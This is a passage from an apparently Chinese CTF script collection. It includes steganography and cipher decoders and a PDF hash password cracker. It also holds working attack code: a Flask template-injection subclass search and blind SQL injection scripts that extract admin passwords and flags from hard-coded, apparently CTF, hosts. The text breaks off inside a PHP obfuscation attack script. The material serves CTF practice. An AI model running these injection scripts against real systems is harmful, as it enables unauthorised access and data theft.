range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="base64隐写解密脚本"><a href="#base64隐写解密脚本" class="headerlink" title="base64隐写解密脚本"></a>base64隐写解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'3.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="奇怪的TTL密码脚本-63-127-191-255"><a href="#奇怪的TTL密码脚本-63-127-191-255" class="headerlink" title="奇怪的TTL密码脚本(63 127 191 255)"></a>奇怪的TTL密码脚本(63 127 191 255)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">fp = open(<span class="string">'t.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">flag = binascii.unhexlify(flag)</span><br><span class="line">wp = open(<span class="string">'res.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br><span class="line"><span class="comment">#00111111 63</span></span><br><span class="line"><span class="comment">#01111111 127</span></span><br><span class="line"><span class="comment">#10111111 191</span></span><br><span class="line"><span class="comment">#11111111 255</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="PDF爆破hash密码"><a href="#PDF爆破hash密码" class="headerlink" title="PDF爆破hash密码"></a>PDF爆破hash密码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/1 11:19</span></span><br><span class="line"><span class="comment"># @Author  : wulasite</span></span><br><span class="line"><span class="comment"># @Email   : wulasite@gmail.com</span></span><br><span class="line"><span class="comment"># @File    : readpdf.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser,PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextBoxHorizontal,LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFTextExtractionNotAllowed</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># 用文件对象来创建一个pdf文档分析器</span></span><br><span class="line">        praser = PDFParser(fp)</span><br><span class="line">        <span class="comment"># 创建一个PDF文档</span></span><br><span class="line">        doc = PDFDocument()</span><br><span class="line">        <span class="comment"># 连接分析器 与文档对象</span></span><br><span class="line">        praser.set_document(doc)</span><br><span class="line">        doc.set_parser(praser)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提供初始化密码</span></span><br><span class="line">        <span class="comment"># 如果没有密码 就创建一个空的字符串</span></span><br><span class="line">        doc.initialize()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检测文档是否提供txt转换，不提供就忽略</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> doc.is_extractable:</span><br><span class="line">            <span class="keyword">raise</span> PDFTextExtractionNotAllowed</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 创建PDf 资源管理器 来管理共享资源</span></span><br><span class="line">            rsrcmgr = PDFResourceManager()</span><br><span class="line">            <span class="comment"># 创建一个PDF设备对象</span></span><br><span class="line">            laparams = LAParams()</span><br><span class="line">            device = PDFPageAggregator(rsrcmgr, laparams=laparams)</span><br><span class="line">            <span class="comment"># 创建一个PDF解释器对象</span></span><br><span class="line">            interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line"></span><br><span class="line">            res = <span class="string">''</span></span><br><span class="line">            <span class="comment"># 循环遍历列表，每次处理一个page的内容</span></span><br><span class="line">            <span class="keyword">for</span> page <span class="keyword">in</span> doc.get_pages():</span><br><span class="line">                interpreter.process_page(page)</span><br><span class="line">                <span class="comment"># 接受该页面的LTPage对象</span></span><br><span class="line">                layout = device.get_result()</span><br><span class="line">                <span class="comment"># 这里layout是一个LTPage对象 里面存放着 这个page解析出的各种对象 一般包括LTTextBox, LTFigure, LTImage, LTTextBoxHorizontal 等等 想要获取文本就获得对象的text属性，</span></span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">                    <span class="keyword">if</span> isinstance(x, LTTextBoxHorizontal):</span><br><span class="line">                        res += x.get_text().strip()</span><br><span class="line">                        <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        print(<span class="string">"Searching word in "</span> + i)</span><br><span class="line">        pdf_text = convert_pdf_2_text(<span class="string">'./'</span>+i)</span><br><span class="line">        <span class="comment"># 这里的分隔符用空格和回车就够了，主要是分割出单词</span></span><br><span class="line">        pdf_text = re.split(<span class="string">' | \n'</span>, pdf_text)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            print(word)</span><br><span class="line">            enc_word = (word + <span class="string">'Salz!'</span>).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">            sha1_password = hashlib.sha1(enc_word).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line">                print(<span class="string">"Find the password :"</span> + word)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="flask模板注入"><a href="#flask模板注入" class="headerlink" title="flask模板注入"></a>flask模板注入</h2><p>检测有哪些含有os模板的模块可以用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">''</span>.__class__.__mro__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> a.__name__ == <span class="string">'catch_warnings'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> a.__init__.__globals__.values():</span><br><span class="line">            <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys():</span><br><span class="line">                    <span class="keyword">print</span> num,item</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="base家族解密脚本-85-16-32-64"><a href="#base家族解密脚本-85-16-32-64" class="headerlink" title="base家族解密脚本(85\16\32\64)"></a>base家族解密脚本(85\16\32\64)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">find_decode = <span class="keyword">lambda</span> d , data : eval(<span class="string">f'base64.<span class="subst">&#123;d&#125;</span>(<span class="subst">&#123;data&#125;</span>)'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(data)</span>:</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> dir(base64): </span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">3</span>:] == <span class="string">'decode'</span>:</span><br><span class="line">      <span class="keyword">try</span>: </span><br><span class="line">        decode_data = find_decode(i,data)</span><br><span class="line">        chars = decode_data <span class="keyword">if</span> all(chr(x).isalpha() <span class="keyword">or</span> chr(x).isspace() <span class="keyword">for</span> x <span class="keyword">in</span> decode_data)<span class="keyword">else</span> <span class="literal">None</span> </span><br><span class="line">        <span class="keyword">if</span> chars != <span class="literal">None</span> : </span><br><span class="line">          <span class="keyword">return</span> <span class="string">f'Decoded String is: <span class="subst">&#123;chars.decode(<span class="string">"utf-8"</span>)&#125;</span>\nEncrypet was used is: <span class="subst">&#123;i[:<span class="number">3</span>]&#125;</span>'</span></span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#_______________ Test _________________</span></span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">b'NM&amp;qnZy;B1a%^M'</span>)) <span class="comment">#output : Hello World , b85</span></span><br><span class="line">print(decode(<span class="string">b'48656C6C6F20576F726C64'</span>))<span class="comment">#output : Hello World , b16</span></span><br><span class="line">print(decode(<span class="string">b'SGVsbG8gV29ybGQ='</span>))<span class="comment">#output : Hello World , b64</span></span><br><span class="line">print(decode(<span class="string">b'JBSWY3DPEBLW64TMMQ======'</span>))<span class="comment">#output : Hello World , b32</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://111.198.29.45:42192/zhuanxvlogin"</span></span><br><span class="line"><span class="comment"># url = "http://localhost:9090/zhuanxvlogin"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    admin_password = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">            guess = chr(n)</span><br><span class="line">            <span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            username = <span class="string">"aaa'\nor\n(select\nsubstring(password,"</span>+str(i)+<span class="string">",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"</span>+guess+<span class="string">"'\nor\n''like'"</span></span><br><span class="line">            data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: <span class="string">"a"</span>&#125;</span><br><span class="line">            req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">            <span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">                admin_password = admin_password + guess</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"admin password: "</span>+ admin_password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> admin_password</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second</span><span class="params">(admin_password)</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">140</span>):</span><br><span class="line">            guess = chr(n)</span><br><span class="line">            <span class="keyword">if</span> guess == <span class="string">"_"</span> <span class="keyword">or</span> guess == <span class="string">"%"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            username = <span class="string">"aa'\nor\n(select\nsubstring(welcometoourctf,"</span>+str(i)+<span class="string">",1)\nfrom\nFlag)\nlike\n'"</span>+guess+<span class="string">"'\nand\n''like'"</span></span><br><span class="line">            data = &#123;<span class="string">"user.name"</span>: username, <span class="string">"user.password"</span>: admin_password&#125;</span><br><span class="line">            req = requests.post(url, data=data, timeout=<span class="number">1000</span>).text</span><br><span class="line">            <span class="keyword">if</span> len(req)&gt;<span class="number">5000</span>:</span><br><span class="line">                flag = flag + guess</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"flag:"</span> + flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">admin_password = first()    </span><br><span class="line">second(admin_password)</span><br></pre></td></tr></table></figure>
<p>常见模板<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://47.94.221.39:8004//index.php?id=3%20%df%27and%20(case%20when(ord(mid((select%20group_concat(flag)from%20flag)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23"</span></span><br><span class="line">        res=requests.get(url.format(i,j))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'img'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(chr(j))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;q22!sa_web_sql_2245y2g44&#125;</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="php混淆攻击脚本"><a href="#php混淆攻击脚本" class="headerlink" title="php混淆攻击脚本"></a>php混淆攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> 